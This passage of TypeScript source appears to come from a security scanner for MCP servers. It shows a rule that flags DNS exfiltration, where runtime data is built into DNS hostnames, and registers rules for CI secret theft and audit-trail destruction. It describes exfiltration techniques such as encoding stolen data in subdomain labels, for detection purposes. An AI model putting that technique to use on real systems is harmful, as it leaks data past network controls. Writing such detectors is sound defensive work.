                `user data? (2) what domain the query targets — is it a legitimate service or a ` +
                `potentially attacker-controlled domain? (3) is there any encoding (base64, hex) applied ` +
                `to the data before DNS query construction?`,
              target: `source_code:${line}`,
              expected_observation:
                "Runtime data is interpolated into DNS hostname — potential exfiltration channel.",
            })
            .verification({
              step_type: "check-config",
              instruction:
                "Verify DNS egress controls: (1) DNS allowlist restricting queries to approved domains, " +
                "(2) DNS proxy or sinkhole blocking unknown domain queries, (3) DNS query monitoring " +
                "for high-entropy subdomain patterns indicating tunneling/exfiltration. Also check if " +
                "the dynamic DNS usage has a legitimate purpose (e.g., service discovery, CDN routing).",
              target: "DNS egress filtering, monitoring, and legitimate use case assessment",
              expected_observation:
                "No DNS egress controls — dynamic hostname queries pass through unmonitored.",
            });

          const g7LineText = context.source_code.split("\n")[line - 1] || "";
          const g7Signals = computeCodeSignals({
            sourceCode: context.source_code, matchLine: line, matchText: match[0],
            lineText: g7LineText, context, owaspCategory: "MCP04-data-exfiltration",
          });
          for (const sig of g7Signals) { g7RegexChain.factor(sig.factor, sig.adjustment, sig.rationale); }
          const g7Chain = g7RegexChain.build();

          findings.push({
            rule_id: "G7",
            severity: "critical",
            evidence:
              `[Pattern] ${desc} at line ${line}: "${match[0].slice(0, 80)}". ` +
              `Dynamic DNS queries can encode stolen data in subdomain labels.`,
            remediation:
              "Never construct DNS hostnames from runtime data. " +
              "Use static hostnames only. DNS exfiltration bypasses all HTTP-layer security.",
            owasp_category: "MCP04-data-exfiltration",
            mitre_technique: "AML.T0057",
            confidence: g7Chain.confidence,
            metadata: { analysis_type: "regex_fallback", line, evidence_chain: g7Chain },
          });
          break;
        }
      }
    }

    return findings;
  }
}

// ─── Register ──────────────────────────────────────────────────────────────

registerTypedRule(new CISecretExfilRule());
registerTypedRule(new AuditTrailDestructionRule());
registerTypedRule(new DNSExfiltrationRule());
